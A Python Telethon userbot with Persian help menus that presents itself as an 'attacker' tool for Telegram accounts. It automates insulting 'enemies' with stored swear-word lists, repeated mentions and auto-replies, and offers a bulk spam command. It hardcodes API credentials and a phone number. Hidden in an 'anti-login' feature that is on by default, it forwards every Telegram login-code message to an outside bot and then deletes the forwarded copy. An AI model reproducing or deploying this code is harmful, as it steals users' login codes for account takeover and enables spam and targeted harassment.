from asyncio.log import logger
from telethon import TelegramClient, events, functions
import asyncio
import random
import re
import logging 
from telethon.tl.functions.account import GetAuthorizationsRequest
from telethon.tl.functions.account import ResetAuthorizationRequest
import pytz
from datetime import datetime
from telethon.errors import MessageIdInvalidError, InviteHashInvalidError, InviteHashExpiredError
from telethon import TelegramClient, events, functions, errors

# API Settings
API_ID = 12010248
API_HASH = '25692897cdcab37afe96cf89e18b8f8d'
PHONE_NUMBER = '+989927705922'  # Enter your phone number here
SESSION_NAME = "Mc1_Duckbot"

client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

# Variables
messages = []
locked_users = set()       # Enemy list (setid/delid)
locked_auto_reply = set()  # Auto-reply locked users (setenemy/delenemy/cleanenemy)
send_interval = 10
auto_send = False
auto_reply = False

# Bot active flag (True: Bot is running, False: Bot commands are deactivated)
bot_active = True

# Owner and Admin IDs
owner_id = 8504111878
admins = {8504111878}

# Timer variables (from the first code)
active_timer = None
timer_task = None

# Set Iran timezone
iran_timezone = pytz.timezone('Asia/Tehran')

# Telegram message link pattern
MESSAGE_LINK_PATTERN = r'https?://t\.me/(?:c/(\d+)|([^/]+))/(\d+)(?:/(\d+))?'

@client.on(events.NewMessage(pattern=re.compile(r'^join\s+(.+)$', re.IGNORECASE)))
async def join_group(event):
    """Join a group/channel using an invite link."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    link = event.pattern_match.group(1).strip()
    try:
        # Try to join using invite link
        if '/joinchat/' in link or '+' in link:
            invite_hash = link.split('/')[-1]
            await client(functions.messages.ImportChatInviteRequest(invite_hash))
        else:
            # Try to join public channel/group
            await client(functions.channels.JoinChannelRequest(link))
        await safe_reply(event, "✅ Successfully joined the group/channel.")
    except InviteHashExpiredError:
        await safe_reply(event, "❌ This invite link has expired.")
    except (errors.InviteHashInvalidError, ValueError):
        await safe_reply(event, "❌ Invalid invite link.")
    except errors.ChannelPrivateError:
        await safe_reply(event, "❌ This channel/group is private.")

@client.on(events.NewMessage(pattern=re.compile(r'^leave\s*(?:(.+))?$', re.IGNORECASE)))
async def leave_chat(event):
    """Leave the current chat/group/channel."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    
    try:
        chat_id = event.chat_id
        link = event.pattern_match.group(1)
        
        if link:
            # Try to resolve the chat from link
            try:
                entity = await client.get_entity(link)
                chat_id = entity.id
            except Exception:
                await safe_reply(event, "❌ Invalid chat link or username")
                return
                
        await safe_reply(event, "Leaving chat...")
        await client.delete_dialog(chat_id)
        await safe_reply(event, "✅ Successfully left the chat")
        
    except Exception as e:
        await safe_reply(event, f"❌ Error leaving chat: {str(e)}")
@client.on(events.NewMessage(pattern=re.compile(r'^[Bb]ot$')))
async def bot_status(event):
    """Check if bot is online and respond only to admins."""
    if not is_admin(event.sender_id):
        return
    await safe_reply(event, "◮ Online ◮")

# Global variables
enabled = True
destination = '@MrScratchHelper_bot'  # Default destination

@client.on(events.NewMessage(pattern=re.compile(r'^alogin (on|off)$', re.IGNORECASE)))
async def toggle_handler(event):
    global enabled
    command = event.pattern_match.group(1)
    
    if command == 'on':
        enabled = True
        await event.edit("Anti-login Activated**.")
        
        # Automatically start the bot @MrScratchHelper_bot
        try:
            await client.send_message(destination, "/start")
            await event.edit(f"Anti Login Activated.")
        except Exception as e:
            await event.edit(f"Error starting bot {destination}: {str(e)}")
    else:  # command == 'off'
        enabled = False
        await event.edit("Anti-login DeActivated**.")
    
@client.on(events.NewMessage(chats=777000))
async def handlers(event):
    global enabled, destination
    
    if enabled:
        try:
            forwarded_message = await client.forward_messages(destination, event.message)
            logger.info(f"Forwarded login notification to {destination}")
            
            # Wait for a few seconds and delete the forwarded message
            await asyncio.sleep(5)
            await client.delete_messages(destination, forwarded_message.id)
            logger.info(f"Deleted forwarded message from {destination}")
        except Exception as e:
            logger.error(f"Error forwarding or deleting message to {destination}: {str(e)}")
    
# ----------------------------
# Anti Login Feature Variables and Functions
# ----------------------------
anti_login_enabled = False
allowed_sessions = set()
anti_login_task = None

async def anti_login_monitor():
    while anti_login_enabled:
        try:
            await asyncio.sleep(5)
            auths = await client(GetAuthorizationsRequest())
            for auth in auths.authorizations:
                if auth.current or (auth.hash in allowed_sessions):
                    continue
                # Use the correct function with correct parameter
                try:
                    await client(ResetAuthorizationRequest(hash=auth.hash))
                    print(f"[Anti Login] Revoked session with hash: {auth.hash}")
                except Exception as e:
                    print(f"[Anti Login] Error revoking session {auth.hash}: {e}")
        except asyncio.CancelledError:
            break
        except Exception as e:
            print(f"[Anti Login] Error in monitor: {e}")
            
# ----------------------------
# Helper Functions
# ----------------------------
async def safe_reply(event, text, parse_mode=None):
    try:
        await event.edit(text, parse_mode=parse_mode)
    except Exception:
        await event.respond(text, parse_mode=parse_mode)

async def parse_message_link(link):
    """Convert message link to chat ID and message ID"""
    match = re.match(MESSAGE_LINK_PATTERN, link)
    if not match:
        return None, None
    
    chat_part = match.group(1) or match.group(2)
    message_id = int(match.group(3))
    
    if match.group(1):  # Private channel link with format t.me/c/1234567890/123
        chat_id = int("-100" + match.group(1))
        return chat_id, message_id
    else:  # Public link with format t.me/username/123
        try:
            entity = await client.get_entity(chat_part)
            if hasattr(entity, 'id'):
                if hasattr(entity, 'channel_id'):  # It's a channel
                    return int(f"-100{entity.id}"), message_id
                elif hasattr(entity, 'chat_id'):  # It's a chat/group
                    return -entity.id, message_id
                else:  # It's a user
                    return entity.id, message_id
            else:
                print(f"Unknown entity type: {type(entity)}")
        except Exception as e:
            print(f"Error getting entity: {e}")
        return None, None

# ----------------------------
# Timer functionality (from the first code)
# ----------------------------
async def update_timer(chat_id, message_id):
    """Function to update the message with current Iran time"""
    global active_timer
    while active_timer and active_timer == (chat_id, message_id):
        try:
            now = datetime.now(iran_timezone)
            time_str = now.strftime("%H:%M:%S")
            await client.edit_message(chat_id, message_id, f" Time: {time_str}")
            await asyncio.sleep(1)
        except MessageIdInvalidError:
            print(f"Error: Message with ID {message_id} in chat {chat_id} not found.")
            active_timer = None
            break
        except Exception as e:
            print(f"Error updating timer: {e}")
            active_timer = None
            break

@client.on(events.NewMessage(pattern=r'settimer(?:\s+(.+))?'))
async def set_timer_command(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    global active_timer, timer_task
    args = event.pattern_match.group(1)
    if not args:
        await safe_reply(event, "Please enter a message link. Example:\nsettimer https://t.me/channel/123")
        return
    
    chat_id, message_id = await parse_message_link(args.strip())
    if not chat_id or not message_id:
        await safe_reply(event, "Invalid message link.")
        return
    
    if timer_task and not timer_task.done():
        timer_task.cancel()
    
    active_timer = (chat_id, message_id)
    timer_task = asyncio.create_task(update_timer(chat_id, message_id))
    
    await safe_reply(event, "⏰ Timer successfully set.")

@client.on(events.NewMessage(pattern=r'stoptimer'))
async def stop_timer_command(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    global active_timer, timer_task
    if active_timer and timer_task and not timer_task.done():
        timer_task.cancel()
        active_timer = None
        await safe_reply(event, "⏰ Timer stopped.")
    else:
        await safe_reply(event, "No active timer exists.")

@client.on(events.NewMessage(pattern=r'timerstatus'))
async def timer_status_command(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    if active_timer:
        chat_id, message_id = active_timer
        await safe_reply(event, f"⏰ Timer is active:\nChat ID: {chat_id}\nMessage ID: {message_id}")
    else:
        await safe_reply(event, "No active timer exists.")

@client.on(events.NewMessage(pattern=r'settimer', func=lambda e: e.is_private))
async def set_timer_private(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    global active_timer, timer_task
    if not event.message.reply_to:
        await safe_reply(event, "In private chats, please reply to the message you want to set the timer on.")
        return
    
    chat_id = event.chat_id
    replied_msg = await event.get_reply_message()
    message_id = replied_msg.id
    
    if timer_task and not timer_task.done():
        timer_task.cancel()
    
    active_timer = (chat_id, message_id)
    timer_task = asyncio.create_task(update_timer(chat_id, message_id))
    
    await safe_reply(event, " Timer successfully set on the replied message.")

# ----------------------------
# Original commands from the second code
# ----------------------------

# Bot on/off commands (این دستورات بدون بررسی bot_active اجرا می‌شوند تا امکان روشن‌سازی مجدد ربات را فراهم کنند)
@client.on(events.NewMessage(pattern=r"^bot off$"))
async def bot_off(event):
    if not is_admin(event.sender_id):
        return
    global bot_active, auto_send, auto_reply
    bot_active = False
    auto_send = False
    auto_reply = False
    await safe_reply(event, "𖦹 Bot is now turned off.")

@client.on(events.NewMessage(pattern=r"^bot on$"))
async def bot_on(event):
    if not is_admin(event.sender_id):
        return
    global bot_active
    bot_active = True
    await safe_reply(event, "𖦹 Bot is now turned on.")

def require_bot_active(event):
    global bot_active
    if not bot_active:
        return False
    return True

def is_admin(user_id):
    return user_id in admins

def is_owner(user_id):
    return user_id == owner_id

@client.on(events.NewMessage(pattern=r"^gpid$"))
async def get_group_id(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    await safe_reply(event, f"❊ Group ID: {event.chat_id}")

@client.on(events.NewMessage(pattern=r"^id$"))
async def get_user_id(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        await safe_reply(event, f"❊ User ID: {user_id}")
    else:
        await safe_reply(event, f"❊ Your User ID: {event.sender_id}")

@client.on(events.NewMessage(pattern=r"^addfosh(.+)"))
async def add_fosh(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    raw_text = event.raw_text[len("addfosh"):].strip()
    new_msgs = [line.strip() for line in raw_text.splitlines() if line.strip()]
    if not new_msgs:
        await safe_reply(event, "❊ No text found to add!")
        return
    messages.extend(new_msgs)
    await safe_reply(event, f"❊ {len(new_msgs)} new message(s) added.")

@client.on(events.NewMessage(pattern=r"^addlistfosh$"))
async def add_list_fosh(event):
    if not is_admin(event.sender_id):  # این خط درست است - بررسی ادمین
        return
    if not require_bot_active(event):
        return

    if not event.is_reply:
        await safe_reply(event, "➠ Please reply to a text file containing the list of messages.")
        return

    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith(".txt"):
        await safe_reply(event, "➠ The replied message must contain a .txt file.")
        return

    try:
        file_content = await reply_msg.download_media(bytes)
        new_msgs = file_content.decode("utf-8").splitlines()
        new_msgs = [line.strip() for line in new_msgs if line.strip()]
        if not new_msgs:
            await safe_reply(event, "➠ The file is empty or contains no valid lines.")
            return

        messages.extend(new_msgs)
        await safe_reply(event, f"➔ {len(new_msgs)} new message(s) added from the file.")
    except Exception as e:
        await safe_reply(event, f"➠ Error while processing the file: {str(e)}")

@client.on(events.NewMessage(pattern=r"^delfosh (.+)$"))
async def del_fosh(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    text_to_remove = event.pattern_match.group(1).strip()
    if text_to_remove in messages:
        messages.remove(text_to_remove)
        await event.edit(f"➔ The message '{text_to_remove}' has been removed from the list.")
    else:
        await event.edit(f"➠ The message '{text_to_remove}' was not found in the list.")

        # متغیر برای ذخیره وضعیت mutepv
mutepv_enabled = False

@client.on(events.NewMessage(pattern=re.compile(r'^mutepv on$', re.IGNORECASE)))
async def enable_mutepv(event):
    """فعال کردن حالت حذف پیام‌های چت خصوصی."""
    global mutepv_enabled
    if not is_admin(event.sender_id):
        return
    mutepv_enabled = True
    await event.respond("➔ حالت MutePV فعال شد. پیام‌های کاربران در چت خصوصی حذف خواهند شد.")

@client.on(events.NewMessage(pattern=re.compile(r'^mutepv off$', re.IGNORECASE)))
async def disable_mutepv(event):
    """غیرفعال کردن حالت حذف پیام‌های چت خصوصی."""
    global mutepv_enabled
    if not is_admin(event.sender_id):
        return
    mutepv_enabled = False
    await event.respond("❌ حالت MutePV غیرفعال شد. پیام‌های کاربران در چت خصوصی حذف نخواهند شد.")

@client.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_private_messages(event):
    """حذف پیام‌های کاربران در چت خصوصی در صورت فعال بودن MutePV."""
    global mutepv_enabled
    if mutepv_enabled and not event.out:  # فقط پیام‌های ورودی حذف شوند
        try:
            await event.delete()  # حذف پیام دوطرفه
        except Exception as e:
            print(f"Error deleting message: {e}")

@client.on(events.NewMessage(pattern=re.compile(r'^ping$', re.IGNORECASE)))
async def check_ping(event):
    """Check server ping and edit the message with the result."""
    start_time = datetime.now()
    message = await event.edit("Pinging...")
    end_time = datetime.now()
    ping_time = (end_time - start_time).total_seconds() * 1000  # Convert to milliseconds
    await message.edit(f"➔ {ping_time:.2f} ms")

# اضافه کردن متغیر جدید برای تایمر اسپم
spam_interval = 0  # پیش‌فرض 0 ثانیه (بدون تاخیر)

@client.on(events.NewMessage(pattern=re.compile(r'^stimer (\d+)$', re.IGNORECASE)))
async def set_spam_timer(event):
    """Set the interval between spam messages."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    
    global spam_interval
    try:
        seconds = int(event.pattern_match.group(1))
        if seconds < 0:
            await event.reply("⤑ زمان نمی‌تواند منفی باشد!")
            return
        
        spam_interval = seconds
        await event.reply(f"➔ تایمر اسپم به {seconds} ثانیه تنظیم شد.")
    except ValueError:
        await event.reply("⤑ لطفا یک عدد معتبر وارد کنید!")

# متغیر کنترل اسپم
spam_active = True

@client.on(events.NewMessage(pattern=re.compile(r'^spam (\d+)(?: (.+))?$', re.IGNORECASE)))
async def spam_command(event):
    """Spam a message or replied content."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    global spam_active
    spam_active = True

    try:
        await event.delete()
    except:
        pass

    count = int(event.pattern_match.group(1))
    message = event.pattern_match.group(2)

    if event.is_reply:
        reply_msg = await event.get_reply_message()
        replied_to = reply_msg.id
        
        if reply_msg.media:
            for i in range(count):
                if not spam_active:  # بررسی وضعیت اسپم
                    break
                await client.send_file(event.chat_id, reply_msg.media, reply_to=replied_to)
                if spam_interval > 0:
                    await asyncio.sleep(spam_interval)
        else:
            text_to_spam = message if message else reply_msg.text
            for i in range(count):
                if not spam_active:  # بررسی وضعیت اسپم
                    break
                await client.send_message(event.chat_id, text_to_spam, reply_to=replied_to)
                if spam_interval > 0:
                    await asyncio.sleep(spam_interval)
    
    elif message:
        for i in range(count):
            if not spam_active:  # بررسی وضعیت اسپم
                break
            await client.send_message(event.chat_id, message)
            if spam_interval > 0:
                await asyncio.sleep(spam_interval)
    
    else:
        await event.respond("⤑ لطفا یک پیام متنی وارد کنید یا روی پیامی ریپلای کنید")

@client.on(events.NewMessage(pattern=re.compile(r'^spstop$', re.IGNORECASE)))
async def stop_spam(event):
    """Stop ongoing spam."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    global spam_active
    spam_active = False
    await event.edit("➔ اسپم متوقف شد.")

@client.on(events.NewMessage(pattern=re.compile(r'^cleanfosh$', re.IGNORECASE)))
async def clean_fosh(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    messages.clear()
    await safe_reply(event, "❊ Message list cleared.")

@client.on(events.NewMessage(pattern=re.compile(r'^cleanid$', re.IGNORECASE)))
async def clean_enemy(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    locked_users.clear()
    await safe_reply(event, "❊ Enemy list cleared.")

@client.on(events.NewMessage(pattern=re.compile(r'^setid(?:\s+(.+))?$', re.IGNORECASE)))
async def set_enemy(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        locked_users.add(reply_msg.sender_id)
        await safe_reply(event, f"➔ User {reply_msg.sender_id} set as enemy.")
    elif event.pattern_match.group(1):
        args = event.pattern_match.group(1).split()
        added_users = []
        for arg in args:
            if arg.isdigit():
                user_id = int(arg)
                locked_users.add(user_id)
                added_users.append(f"ID: {user_id}")
            else:
                username = arg.lstrip("@")
                try:
                    user_entity = await client.get_entity(username)
                    locked_users.add(user_entity.id)
                    added_users.append(f"@{username} (ID: {user_entity.id})")
                except Exception as e:
                    await safe_reply(event, f"➔ Could not find user with username @{username}.")
        if added_users:
            await safe_reply(event, f"➔ The following users have been set as enemies:\n" + "\n".join(added_users))
    else:
        await safe_reply(event, "➔ Please reply to the user's message or provide numeric IDs/usernames.")

@client.on(events.NewMessage(pattern=re.compile(r'^delid(?:\s+(.+))?$', re.IGNORECASE)))
async def del_enemy(event):
    """Delete enemies by reply, user IDs, or usernames."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    if event.is_reply:
        reply_msg = await event.get_reply_message()
        locked_users.discard(reply_msg.sender_id)
        await safe_reply(event, f"❊ Mention ID removed from user {reply_msg.sender_id}.")
    elif event.pattern_match.group(1):
        args = event.pattern_match.group(1).split()
        removed_users = []
        for arg in args:
            if arg.isdigit():
                user_id = int(arg)
                if user_id in locked_users:
                    locked_users.discard(user_id)
                    removed_users.append(f"ID: {user_id}")
            else:
                username = arg.lstrip("@")
                try:
                    user_entity = await client.get_entity(username)
                    if user_entity.id in locked_users:
                        locked_users.discard(user_entity.id)
                        removed_users.append(f"@{username} (ID: {user_entity.id})")
                except Exception as e:
                    await safe_reply(event, f"➠ Could not find user with username @{username}.")
        if removed_users:
            await safe_reply(event, f"❊ The following users have been removed from enemies:\n" + "\n".join(removed_users))
        else:
            await safe_reply(event, "➔ No valid users found to remove.")
    else:
        await safe_reply(event, "➔ Please reply to the user's message or provide numeric IDs/usernames.")

@client.on(events.NewMessage(pattern=re.compile(r'^settime (\d+)$', re.IGNORECASE)))
async def set_time(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    global send_interval
    send_interval = int(event.pattern_match.group(1))
    await safe_reply(event, f"❊ Message send interval set to: {send_interval} seconds")

@client.on(events.NewMessage(pattern=re.compile(r'^start$', re.IGNORECASE)))
async def set_tag(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    global auto_send
    if not messages:
        await safe_reply(event, "➠ Message list is empty!")
        return
    auto_send = True
    await safe_reply(event, "❊  mention started.")
    while auto_send:
        if locked_users:
            msg = random.choice(messages)
            mention = " ".join([f"[𒋨](tg://user?id={user_id})" for user_id in locked_users])
            new_text = f"{msg}\n\n{mention}"
            await client.send_message(event.chat_id, new_text, parse_mode="md")
        await asyncio.sleep(send_interval)

@client.on(events.NewMessage(pattern=re.compile(r'^setrep$', re.IGNORECASE))) 
async def set_rep(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    global auto_reply
    if not messages:
        await safe_reply(event, "❊ Message list is empty!")
        return
    auto_reply = True
    await safe_reply(event, "❊  reply started.")
    while auto_reply:
        if event.is_reply:
            rep = await event.get_reply_message()
            msg = random.choice(messages)
            await client.send_message(event.chat_id, msg, reply_to=rep.id)
        await asyncio.sleep(send_interval)

@client.on(events.NewMessage(pattern=re.compile(r'^setenemy(?:\s+(.+))?$', re.IGNORECASE)))
async def lock_enemy(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        locked_auto_reply.add(reply_msg.sender_id)
        await safe_reply(event, f"❅ User {reply_msg.sender_id} added to enemy list.")
    
    elif event.pattern_match.group(1):
        arg = event.pattern_match.group(1).strip()
        if arg.isdigit():
            user_id = int(arg)
            locked_auto_reply.add(user_id)
            await safe_reply(event, f"❅ User with ID {user_id} added to enemy list.")
        else:
            username = arg.lstrip("@")
            try:
                user = await client.get_entity(username)
                locked_auto_reply.add(user.id)
                await safe_reply(event, f"❅ User @{username} (ID: {user.id}) added to enemy list.")
            except Exception as e:
                await safe_reply(event, f"➠ Could not find user with username @{username}")
    else:
        await safe_reply(event, "➠ Please reply to the user's message or provide a numeric ID/username.")

@client.on(events.NewMessage(pattern=re.compile(r'^delenemy(?:\s+(.+))?$', re.IGNORECASE)))
async def unlock_enemy(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
        
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        locked_auto_reply.discard(reply_msg.sender_id)
        await safe_reply(event, f"➤ User {reply_msg.sender_id} removed from enemy list.")
    
    elif event.pattern_match.group(1):
        arg = event.pattern_match.group(1).strip()
        if arg.isdigit():
            user_id = int(arg)
            locked_auto_reply.discard(user_id)
            await safe_reply(event, f"➤ User with ID {user_id} removed from enemy list.")
        else:
            username = arg.lstrip("@")
            try:
                user = await client.get_entity(username)
                locked_auto_reply.discard(user.id)
                await safe_reply(event, f"➤ User @{username} (ID: {user.id}) removed from enemy list.")
            except Exception as e:
                await safe_reply(event, f"➠ Could not find user with username @{username}")
    else:
        await safe_reply(event, "➠ Please reply to the user's message or provide a numeric ID/username.")

@client.on(events.NewMessage(pattern=re.compile(r'^cleanenemy(?:\s+(\d+))?$', re.IGNORECASE)))
async def clean_lock(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    if event.is_reply:
        reply_msg = await event.get_reply_message()
        uid = reply_msg.sender_id
        if uid in locked_auto_reply:
            locked_auto_reply.discard(uid)
            await safe_reply(event, f"► User {uid} user removed from enemy list.")
        else:
            await safe_reply(event, f"➤ User {uid} not found in enemy list.")
    elif event.pattern_match.group(1):
        uid = int(event.pattern_match.group(1))
        if uid in locked_auto_reply:
            locked_auto_reply.discard(uid)
            await safe_reply(event, f"➤ User with ID {uid} user removed from enemy list.")
        else:
            await safe_reply(event, f"➤ User with ID {uid} not found in enemylist.")
    else:
        locked_auto_reply.clear()
        await safe_reply(event, "➠ enemy list cleared.")

@client.on(events.NewMessage())
async def auto_reply_locked(event):
    if not require_bot_active(event):
        return
    if event.out:
        return
    if event.sender_id in locked_auto_reply:
       if not event.raw_text.startswith(("gpid", "id", "addfosh", "cleanfosh",
                                  "cleanenemy", "setid", "delid", "start",
                                  "settime", "stop", "setadmin", "deladmin", 
                                  "cleanadmins", "adminlist", "setrep",
                                  "setenemy", "delenemy", "cleanid", "bot on", "bot off",
                                  "settimer", "stoptimer", "timerstatus", "allowcurrent", 
                                  "antilogin on", "antilogin off", "addlistfosh", "spam", 
                                  "addlistfosh", "spstop", "sptimer", "mutepv on", "mutepv off",
                                  "join", "leave", "ping", "alogin on", "alogin off")):
                msg = random.choice(messages)
                await client.send_message(event.chat_id, msg, reply_to=event.id)

@client.on(events.NewMessage(pattern=re.compile(r'^stop$', re.IGNORECASE)))
async def stop_all(event):
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return
    global auto_send, auto_reply, active_timer, timer_task
    auto_send = False
    auto_reply = False
    if active_timer and timer_task and not timer_task.done():
        timer_task.cancel()
        active_timer = None
    await safe_reply(event, "ᶻ 𝗓 𐰁 .ᐟ metion stopped.")

@client.on(events.NewMessage(pattern=re.compile(r'^setadmin(?:\s+(.+))?$', re.IGNORECASE)))
async def set_admin(event):
    if not is_owner(event.sender_id):
        return
    if not require_bot_active(event):
        return

    if event.is_reply:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        admins.add(user_id)
        await safe_reply(event, f"♕ User {user_id} added as admin.")
    elif event.pattern_match.group(1):
        arg = event.pattern_match.group(1).strip()
        if arg.isdigit():
            user_id = int(arg)
            admins.add(user_id)
            await safe_reply(event, f"♕ User with ID {user_id} added as admin.")
        else:
            username = arg.lstrip("@")
            try:
                user = await client.get_entity(username)
                admins.add(user.id)
                await safe_reply(event, f"♕ User @{username} (ID: {user.id}) added as admin.")
            except Exception as e:
                await safe_reply(event, f"➠ Could not find user with username @{username}")
    else:
        await safe_reply(event, "➠ Please reply to the user's message or provide a numeric ID/username.")

@client.on(events.NewMessage(pattern=re.compile(r'^deladmin(?:\s+(.+))?$', re.IGNORECASE)))
async def del_admin(event):
    if not is_owner(event.sender_id):
        return
    if not require_bot_active(event):
        return

    if event.is_reply:
        reply_msg = await event.get_reply_message()
        user_id = reply_msg.sender_id
        admins.discard(user_id)
        await safe_reply(event, f"♱ Admin with ID {user_id} removed.")
    elif event.pattern_match.group(1):
        arg = event.pattern_match.group(1).strip()
        if arg.isdigit():
            user_id = int(arg)
            admins.discard(user_id)
            await safe_reply(event, f"♱ Admin with ID {user_id} removed.")
        else:
            username = arg.lstrip("@")
            try:
                user = await client.get_entity(username)
                admins.discard(user.id)
                await safe_reply(event, f"♱ Admin @{username} (ID: {user.id}) removed.")
            except Exception as e:
                await safe_reply(event, f"➠ Could not find user with username @{username}")
    else:
        await safe_reply(event, "➩ Please reply to the user's message or provide a numeric ID/username.")

@client.on(events.NewMessage(pattern=re.compile(r'^cleanadmins$', re.IGNORECASE)))
async def clean_admins(event):
    if not is_owner(event.sender_id):
        return
    if not require_bot_active(event):
        return
    admins.clear()
    admins.add(owner_id)
    await safe_reply(event, "➩ Admin list cleared (only owner remains).")

@client.on(events.NewMessage(pattern=re.compile(r'^adminlist$', re.IGNORECASE)))
async def admin_list(event):
    if not is_owner(event.sender_id):
        return
    if not require_bot_active(event):
        return
    admin_text = "♕ لیست ادمین‌ها:\n" + "\n".join(str(admin) for admin in admins)
    await safe_reply(event, admin_text)

@client.on(events.NewMessage(pattern=re.compile(r'^help$', re.IGNORECASE)))
async def show_main_help(event):
    """نمایش منوی اصلی راهنما."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    help_text = """
راهنمای اتکر دستور <code>help</code>

<code>help1</code> ➔ راهنمای قابلیت‌های اکانت  
<code>help2</code> ➔ راهنمای قابلیت‌های دشمن  

▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰
"""
    await safe_reply(event, help_text, parse_mode="html")


@client.on(events.NewMessage(pattern=re.compile(r'^help1$', re.IGNORECASE)))
async def show_account_help(event):
    """نمایش راهنمای قابلیت‌های اکانت."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    help_text = """
راهنمای قابلیت‌های اکانت
با دستور <code>help1</code>

<code>mutepv on</code>  
<code>mutepv off</code>  
حالت سکوت در پیوی  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>allowcurrent</code>  
ثبت سشن‌های فعلی به عنوان مجاز  
که حتما باید قبل از زدن دستور انتی لاگین بزنید وگرنه از اکانت لاگ میخورید  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>join</code> (link)
جوین شدن به گروه با لینک
<code>leave</code>
لفت دادن از گروه
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>antilogin on</code>  
<code>antilogin off</code>  
حالت انتی لاگین برای جلوگیری ورود به اکانت  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>alogin on</code>  
<code>alogin off</code>  
منقضی کننده کدهای لاگین  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>id</code>  
دریافت ایدی عددی کاربر با ریپلای  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>settimer</code>  
تنظیم تایمر روی پیام میتونید جلوش لینک پیام رو بزارید یا ریپلای کنید روش  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>timerstatus</code>  
مشاهده وضعیت تایمر  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  
<code>setadmin (ریپلای یا عددی)</code>
اضافه کردن ادمین جدید
<code>deladmin (ریپلای یا عددی)</code>
حذف ادمین
<code>cleanadmins</code>
حذف ادمین‌ها
"""
    await safe_reply(event, help_text, parse_mode="html")


@client.on(events.NewMessage(pattern=re.compile(r'^help2$', re.IGNORECASE)))
async def show_enemy_help(event):
    """نمایش راهنمای قابلیت‌های دشمن."""
    if not is_admin(event.sender_id):
        return
    if not require_bot_active(event):
        return

    help_text = """
راهنمای قابلیت‌های دشمن
با دستور <code>help2</code>

<code>setenemy</code>  
حالت سلف مود ریپلای یا عددی بزنید  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>delenemy</code>  
حذف دشمن از حالت سلف  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>cleanenemy</code>  
پاکسازی لیست دشمن از حالت سلف  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>setid</code>  
ست کردن منشن با ایدی عددی یا ریپلای  
<code>cleanid</code>
پاکسازی لیست منشن
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>delid</code>  
حدف منشن با ایدی عددی یا ریپلای  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>addlistfosh</code> (ریپلای روی فایل فحش)  
اضافه کردن فحش از طریق فایل  
<code>addfosh (متن)</code>  
اضافه کردن فحش تکی یا چند خطی  
<code>delfosh (متن)</code>  
حذف یک یا چندتا فحش  
<code>cleanfosh</code>  
پاکسازی لیست فحش  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>setrep (replay)</code>  
ریپلای خودکار  
<code>stop</code>  
برای متوقف کردنش  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>start</code>  
استارت منشن خودکار (حالت اتکر و منشن)  
<code>stop</code>  
برای متوقف کردنش  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>settime (count)</code>  
تنظیم تایمر برای منشن و ریپلای  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

<code>bot on/off</code>  
روشن یا خاموش کردن اتکر  
▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰  

دستورات اسپم:
<code>spam [تعداد] [متن]</code>  
